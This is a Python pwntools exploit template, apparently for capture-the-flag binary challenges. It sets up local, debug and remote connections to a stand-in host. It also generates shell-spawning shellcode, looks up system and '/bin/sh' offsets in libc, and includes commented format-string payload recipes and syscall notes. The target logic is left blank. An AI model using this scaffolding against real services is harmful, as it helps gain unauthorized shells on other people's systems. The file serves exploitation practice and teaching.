from pwn import *

def send_payload(payload):
    log.info("payload = %s" % repr(payload))
    r.send(payload)
    return

def sendline_payload(payload):
    log.info("payload = %s" % repr(payload))
    r.sendline(payload)
    return

def print_address(s, addr):
	log.info(s + ' : ' + hex(addr))
	return

binary = './'
host ='exploitme.example.com'
port = 31337

elf = ELF(binary)
context.binary = binary
# context.log_level = 'debug'

'''
r = process(binary)
libc = ELF('./')
'''

'''
s = ssh(user='myria',host='sherlock.myria.break',port=1234,password='asdf')
r = s.process("./binary")
'''

if len(sys.argv) >= 2 and sys.argv[1] == 'r':
	# remote
	r = remote(host, port)
	libc = ELF('./')
elif len(sys.argv) >= 2 and sys.argv[1] == 'd':
	# debug
	r = gdb.debug(binary)
	#  = gdb.debug(binary, env={"LD_PRELOAD" : "./libc-2.27.so"})
	libc = elf.libc
else:
	# local
	r = process(binary)
	# r = process(binary, env={"LD_PRELOAD" : "./libc-2.27.so"})
	libc = elf.libc

shellcode = asm(shellcraft.sh())
str_bin_sh = '/bin/sh\x00'
str_bin = '/bin'
str_sh = '/sh\x00'
nop = '\x90'

# ELF

# addr_plt_read = elf.plt['read']
# addr_got_read = elf.got['read']
# addr_plt_write = elf.plt['write']
# addr_got_write = elf.got['write']
# addr_plt_printf = elf.plt['printf']
# addr_got_printf = elf.got['printf']
# addr_plt_puts = elf.plt['puts']
# addr_got_puts = elf.got['puts']
# addr_plt_fgets = elf.plt['fgets']
# addr_got_fgets = elf.got['fgets']
# addr_plt_system = elf.plt['system']
# addr_symbols_main = elf.symbols['main']

# libc

offset_system = libc.symbols['system']
offset_str_bin_sh = next(libc.search('/bin/sh\x00'))
# offset_printf = libc.symbols['printf']
# addr_plt_fgets = elf.plt['fgets']
# offset_read = libc.symbols['read']
# offset_write = libc.symbols['write']
# offset_mmap = libc.symbols['mmap']
# offset_exit = libc.symbols['exit']

'''
Gadget
rp --file=binary --unique --rop=5
'''

print r.recvuntil(':')

'''
Format string attack

Example
AAAA %p %p %p %p %p %p %p

payload = ''
payload += 'AAAA'
payload += '%p' * 7

offset = 7
payload = fmtstr_payload(offset, {0x0:0xcafebabe}, numbwritten=0, write_size='byte')
payload = fmtstr_payload(offset, {0x0:0xcafebabe}, numbwritten=0, write_size='short')
sendline_payload(payload)
'''

'''
read
ssize_t read(int fd, void *buf, size_t count);

write
ssize_t write(int fd, const void *buf, size_t nbytes);

mmap
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);

32bit syscall
- instruction 0x80
- syscall number : eax
- execve number 11
- up to 6 inputs : ebx, ecx, edx, esi, edi, ebp

64-bit syscall
- instruction : syscall
- syscall number : rax
- execve number 59
- up to 6 inputs : rdi, rsi, rdx, r10, r8, r9
- ref:https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
'''

payload = ''
# payload += 'A' * 256

sendline_payload(payload)

sendline_payload('id')
print r.recvall(timeout=2)

# sleep(1)
# r.interactive()